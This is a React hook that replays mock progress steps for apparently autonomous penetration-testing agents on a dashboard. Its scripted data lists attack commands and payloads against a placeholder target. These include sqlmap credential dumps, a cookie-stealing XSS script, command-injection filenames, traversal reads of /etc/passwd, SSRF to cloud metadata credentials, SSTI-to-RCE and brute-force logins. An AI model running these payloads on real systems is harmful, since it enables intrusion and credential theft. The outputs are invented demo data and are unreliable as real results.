import { useState, useEffect, useRef } from "react";
import type { ExploitAgentStep } from "../../api/agent/types";
import type { ExploitAgentData } from "../agent/queries/useExploitAgentQueries";
import { isMockDataEnabled } from "../../config";
import { subscribeMockAgents } from "./mockAgentsBus";

interface AgentStepUpdate {
  agentId: string;
  agentName: string;
  newStep: ExploitAgentStep;
  delayMs: number;
  description?: string;
}

// Incremental agent step scenario
const agentStepUpdates: AgentStepUpdate[] = [
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 4000,
    description: "Agent-001 performs first step",
    newStep: {
      step_num: 1,
      reflection: "Starting SQL injection testing on login form",
      script: "sqlmap -u http://target/login --forms --batch",
      execution_output: "Testing GET parameter 'username' for SQL injection...\nParameter appears vulnerable to blind boolean-based injection"
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 7000,
    description: "Agent-001 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Confirmed SQL injection vulnerability. Extracting database information.",
      script: "sqlmap -u http://target/login --forms --dbs --batch",
      execution_output: "Available databases:\n[*] information_schema\n[*] mysql\n[*] webapp_db\n[*] test"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 8000,
    description: "Agent-002 starts with first step",
    newStep: {
      step_num: 1,
      reflection: "Scanning for reflected XSS vulnerabilities in search functionality",
      script: "python3 xss_scanner.py --url http://target/search --payload-file payloads.txt",
      execution_output: "Testing search parameter with various XSS payloads...\nFound potential XSS in search parameter: <script>alert(1)</script>"
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 11000,
    description: "Agent-001 adds step 3",
    newStep: {
      step_num: 3,
      reflection: "Dumping user credentials from webapp_db",
      script: "sqlmap -u http://target/login --forms -D webapp_db --tables --batch",
      execution_output: "Database: webapp_db\n[3 tables]\n+----------+\n| users    |\n| sessions |\n| logs     |\n+----------+"
    }
  },
  {
    agentId: "agent-003",
    agentName: "Command Injection Finder",
    delayMs: 12000,
    description: "Agent-003 starts with first step",
    newStep: {
      step_num: 1,
      reflection: "Testing file upload functionality for command injection",
      script: "python3 command_inject.py --url http://target/upload --param filename",
      execution_output: "Testing filename parameter for command injection...\nPayload: test.txt; whoami\nResponse contains: www-data\nCommand injection vulnerability confirmed!"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 14000,
    description: "Agent-002 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Confirming XSS vulnerability and testing for stored XSS",
      script: "curl -X POST http://target/comment -d 'comment=<img src=x onerror=alert(1)>'",
      execution_output: "Comment submitted successfully. Checking if payload persists...\nStored XSS confirmed! Payload executes on comment page."
    }
  },
  {
    agentId: "agent-001",
    agentName: "SQL Injection Hunter",
    delayMs: 17000,
    description: "Agent-001 adds step 4",
    newStep: {
      step_num: 4,
      reflection: "Extracting user credentials from users table",
      script: "sqlmap -u http://target/login --forms -D webapp_db -T users --dump --batch",
      execution_output: "Database: webapp_db\nTable: users\n[3 entries]\n+----+----------+----------------------------------+\n| id | username | password                         |\n+----+----------+----------------------------------+\n| 1  | admin    | 5e884898da28047151d0e56f8dc629... |\n| 2  | user1    | ef92b778bafe771e89245b89ecbc08... |\n| 3  | guest    | 098f6bcd4621d373cade4e832627b4... |\n+----+----------+----------------------------------+"
    }
  },
  {
    agentId: "agent-002",
    agentName: "XSS Detector",
    delayMs: 19000,
    description: "Agent-002 adds step 3",
    newStep: {
      step_num: 3,
      reflection: "Crafting advanced XSS payload to steal session cookies",
      script: "curl -X POST http://target/comment -d 'comment=<script>fetch(\"/steal?cookie=\"+document.cookie)</script>'",
      execution_output: "Advanced payload submitted. Session cookies will be sent to attacker-controlled endpoint when admin views comments."
    }
  },
  {
    agentId: "agent-003",
    agentName: "Command Injection Finder",
    delayMs: 20000,
    description: "Agent-003 adds step 2",
    newStep: {
      step_num: 2,
      reflection: "Attempting to escalate privileges through command injection",
      script: "curl -X POST http://target/upload -F 'file=@test.txt; sudo -l'",
      execution_output: "Executing privilege escalation check...\nUser www-data may run the following commands on target:\n(root) NOPASSWD: /usr/bin/backup.sh\nPrivilege escalation vector identified!"
    }
  },
  // Agent-004 (CSRF Analyzer)
  {
    agentId: "agent-004",
    agentName: "CSRF Analyzer",
    delayMs: 14500,
    description: "Agent-004 identifies missing CSRF token",
    newStep: {
      step_num: 1,
      reflection: "Checking profile update form for CSRF protections",
      script: "python3 csrf_check.py --url http://target/profile",
      execution_output: "Found POST /profile without anti-CSRF token parameter"
    }
  },
  {
    agentId: "agent-004",
    agentName: "CSRF Analyzer",
    delayMs: 17500,
    description: "Agent-004 crafts CSRF PoC",
    newStep: {
      step_num: 2,
      reflection: "Crafting CSRF PoC form to change email",
      script: "generate_csrf_poc --action http://target/profile --data 'email=hacker@example.com'",
      execution_output: "CSRF PoC generated. Submission changes email without user interaction"
    }
  },
  // Agent-005 (Open Redirect Seeker)
  {
    agentId: "agent-005",
    agentName: "Open Redirect Seeker",
    delayMs: 16500,
    description: "Agent-005 tests open redirect",
    newStep: {
      step_num: 1,
      reflection: "Testing redirect with external target",
      script: "curl -I 'http://target/redirect?to=http://evil.com'",
      execution_output: "302 Found with Location: http://evil.com"
    }
  },
  {
    agentId: "agent-005",
    agentName: "Open Redirect Seeker",
    delayMs: 19500,
    description: "Agent-005 confirms encoded redirect",
    newStep: {
      step_num: 2,
      reflection: "Verifying URL-encoded open redirect bypass",
      script: "curl -I 'http://target/redirect?to=%2F%2Fevil.com'",
      execution_output: "302 Found with Location: //evil.com"
    }
  },
  // Agent-006 (Directory Traversal Hunter)
  {
    agentId: "agent-006",
    agentName: "Directory Traversal Hunter",
    delayMs: 18500,
    description: "Agent-006 attempts directory traversal",
    newStep: {
      step_num: 1,
      reflection: "Requesting ../../../etc/passwd via download endpoint",
      script: "curl 'http://target/download?file=../../../../etc/passwd'",
      execution_output: "File content begins with: root:x:0:0:root:/root:/bin/bash"
    }
  },
  {
    agentId: "agent-006",
    agentName: "Directory Traversal Hunter",
    delayMs: 21500,
    description: "Agent-006 confirms alternative traversal",
    newStep: {
      step_num: 2,
      reflection: "Using ..%2F encoding to bypass filters",
      script: "curl 'http://target/download?file=..%2F..%2F..%2Fetc%2Fhosts'",
      execution_output: "Contains 127.0.0.1 localhost"
    }
  },
  // Agent-007 (IDOR Explorer)
  {
    agentId: "agent-007",
    agentName: "IDOR Explorer",
    delayMs: 20500,
    description: "Agent-007 attempts unauthorized order access",
    newStep: {
      step_num: 1,
      reflection: "Changing order ID from 123 to 122",
      script: "curl 'http://target/api/orders/122' -H 'Cookie: session=...'",
      execution_output: "Response 200 with another user's order details"
    }
  },
  {
    agentId: "agent-007",
    agentName: "IDOR Explorer",
    delayMs: 23500,
    description: "Agent-007 confirms missing authorization check",
    newStep: {
      step_num: 2,
      reflection: "Enumerating several order IDs",
      script: "python3 idor_enum.py --url http://target/api/orders/{id} --range 120-130",
      execution_output: "Multiple order records accessible without proper authorization"
    }
  },
  // Agent-008 (Rate Limit Tester)
  {
    agentId: "agent-008",
    agentName: "Rate Limit Tester",
    delayMs: 22500,
    description: "Agent-008 performs login burst",
    newStep: {
      step_num: 1,
      reflection: "Sending 100 login requests in 10 seconds",
      script: "python3 burst_login.py --url http://target/login --count 100 --concurrency 20",
      execution_output: "No throttling observed; all requests processed"
    }
  },
  {
    agentId: "agent-008",
    agentName: "Rate Limit Tester",
    delayMs: 25500,
    description: "Agent-008 confirms brute-force feasibility",
    newStep: {
      step_num: 2,
      reflection: "Testing a small credential set repeatedly",
      script: "python3 brute.py --url http://target/login --users users.txt --pw pws.txt",
      execution_output: "Multiple successful logins suggest weak/no rate limiting"
    }
  },
  // Agent-009 (XXE Scout)
  {
    agentId: "agent-009",
    agentName: "XXE Scout",
    delayMs: 24500,
    description: "Agent-009 submits XXE payload",
    newStep: {
      step_num: 1,
      reflection: "Posting XML with external entity to read /etc/hostname",
      script: "curl -H 'Content-Type: application/xml' -d @xxe_payload.xml http://target/api/upload-xml",
      execution_output: "Response contains server hostname: target-host"
    }
  },
  {
    agentId: "agent-009",
    agentName: "XXE Scout",
    delayMs: 27500,
    description: "Agent-009 confirms file exfiltration via XXE",
    newStep: {
      step_num: 2,
      reflection: "Retrieving /etc/passwd via XXE",
      script: "curl -H 'Content-Type: application/xml' -d @xxe_passwd.xml http://target/api/upload-xml",
      execution_output: "Response includes root:x:0:0 entries"
    }
  },
  // Agent-010 (SSRF Prober)
  {
    agentId: "agent-010",
    agentName: "SSRF Prober",
    delayMs: 26500,
    description: "Agent-010 probes metadata service",
    newStep: {
      step_num: 1,
      reflection: "Requesting 169.254.169.254 via fetch-image",
      script: "curl 'http://target/api/fetch-image?url=http://169.254.169.254/latest/meta-data/'",
      execution_output: "Service responds with list of metadata endpoints"
    }
  },
  {
    agentId: "agent-010",
    agentName: "SSRF Prober",
    delayMs: 29500,
    description: "Agent-010 reads IAM role name",
    newStep: {
      step_num: 2,
      reflection: "Fetching IAM role name via SSRF",
      script: "curl 'http://target/api/fetch-image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
      execution_output: "Role name discovered: web-role"
    }
  },
  // Agent-011 (Weak JWT Detector)
  {
    agentId: "agent-011",
    agentName: "Weak JWT Detector",
    delayMs: 28500,
    description: "Agent-011 inspects JWT algorithm",
    newStep: {
      step_num: 1,
      reflection: "Checking 'alg' field for insecure values",
      script: "python3 jwt_check.py --endpoint http://target/api/auth/me",
      execution_output: "JWT uses HS256; potential key guessing if key weak"
    }
  },
  {
    agentId: "agent-011",
    agentName: "Weak JWT Detector",
    delayMs: 31500,
    description: "Agent-011 attempts none algorithm bypass",
    newStep: {
      step_num: 2,
      reflection: "Attempting 'alg':'none' token acceptance",
      script: "python3 jwt_none.py --endpoint http://target/api/auth/me",
      execution_output: "Endpoint rejects 'none' but HS256 still used"
    }
  },
  // Agent-012 (RCE Finder)
  {
    agentId: "agent-012",
    agentName: "RCE Finder",
    delayMs: 30500,
    description: "Agent-012 attempts template injection",
    newStep: {
      step_num: 1,
      reflection: "Injecting template payload to execute arithmetic",
      script: "curl 'http://target/render?name={{7*7}}'",
      execution_output: "Rendered output contains 49"
    }
  },
  {
    agentId: "agent-012",
    agentName: "RCE Finder",
    delayMs: 33500,
    description: "Agent-012 attempts command execution",
    newStep: {
      step_num: 2,
      reflection: "Escalating payload to execute whoami",
      script: `curl 'http://target/render?name={{self.__init__.__globals__.os.popen("whoami").read()}}'`,
      execution_output: "Output shows running user: www-data"
    }
  },
  // Agent-013 (Path Confusion Checker)
  {
    agentId: "agent-013",
    agentName: "Path Confusion Checker",
    delayMs: 32500,
    description: "Agent-013 tests encoded path traversal",
    newStep: {
      step_num: 1,
      reflection: "Accessing protected file via encoded segments",
      script: "curl 'http://target/static/..%2F..%2Fetc/passwd'",
      execution_output: "Server returns file content; improper normalization"
    }
  },
  {
    agentId: "agent-013",
    agentName: "Path Confusion Checker",
    delayMs: 35500,
    description: "Agent-013 confirms additional sensitive file access",
    newStep: {
      step_num: 2,
      reflection: "Attempting to read /etc/hosts via path confusion",
      script: "curl 'http://target/static/%2e%2e/%2e%2e/etc/hosts'",
      execution_output: "Hosts file content returned"
    }
  }
];

export function useMockAgentSteps(): ExploitAgentData[] {
  const [agentStepsData, setAgentStepsData] = useState<ExploitAgentData[]>([]);
  const timeoutsRef = useRef<NodeJS.Timeout[]>([]);
  const hasStartedRef = useRef(false);
  const deferredByAgentRef = useRef<Record<string, AgentStepUpdate[]>>({});

  useEffect(() => {
    if (!isMockDataEnabled() || hasStartedRef.current) return;

    hasStartedRef.current = true;
    console.log("[MockAgentSteps] Starting incremental agent step simulation");

    // Track which agents are allowed to receive steps (running only)
    const runningAgents = new Set<string>();

    const unsubscribe = subscribeMockAgents((event) => {
      if (event.type === "accept") {
        runningAgents.add(event.id);
        const queued = deferredByAgentRef.current[event.id];
        if (queued && queued.length) {
          setAgentStepsData((currentData) => {
            const next = [...currentData];
            const existingIndex = next.findIndex(d => d.agentId === event.id);
            const stepsToAdd = queued.map(q => q.newStep);
            const agentName = queued[0]?.agentName || event.id;
            if (existingIndex >= 0) {
              next[existingIndex] = {
                ...next[existingIndex],
                agentSteps: [...next[existingIndex].agentSteps, ...stepsToAdd]
              };
            } else {
              next.push({ agentId: event.id, agentName, agentSteps: stepsToAdd });
            }
            return next;
          });
          delete deferredByAgentRef.current[event.id];
        }
      }
      if (event.type === "deny") {
        runningAgents.delete(event.id);
        // Remove steps for denied agent
        setAgentStepsData((curr) => curr.filter((d) => d.agentId !== event.id));
      }
    });

    // Seed any initially running agents
    runningAgents.add("agent-003");
    runningAgents.add("agent-006");
    runningAgents.add("agent-012");

    // Schedule all step updates
    agentStepUpdates.forEach((update) => {
      const timeout = setTimeout(() => {
        // Only apply steps when agent is running; otherwise queue until accepted
        if (!runningAgents.has(update.agentId)) {
          const q = deferredByAgentRef.current[update.agentId] || [];
          deferredByAgentRef.current[update.agentId] = [...q, update];
          return;
        }
        setAgentStepsData(currentData => {
          // Find existing agent data or create new one
          const existingAgentIndex = currentData.findIndex(data => data.agentId === update.agentId);

          if (existingAgentIndex >= 0) {
            // Add step to existing agent
            const updatedData = [...currentData];
            updatedData[existingAgentIndex] = {
              ...updatedData[existingAgentIndex],
              agentSteps: [...updatedData[existingAgentIndex].agentSteps, update.newStep]
            };

            if (update.description) {
              console.log(`[MockAgentSteps] ${update.description}`);
            }

            return updatedData;
          } else {
            // Create new agent data
            const newAgentData: ExploitAgentData = {
              agentId: update.agentId,
              agentName: update.agentName,
              agentSteps: [update.newStep]
            };

            if (update.description) {
              console.log(`[MockAgentSteps] ${update.description}`);
            }

            return [...currentData, newAgentData];
          }
        });
      }, update.delayMs);

      timeoutsRef.current.push(timeout);
    });

    // Cleanup on unmount
    return () => {
      timeoutsRef.current.forEach(timeout => clearTimeout(timeout));
      timeoutsRef.current = [];
      hasStartedRef.current = false;
      unsubscribe();
    };
  }, []);

  return agentStepsData;
}
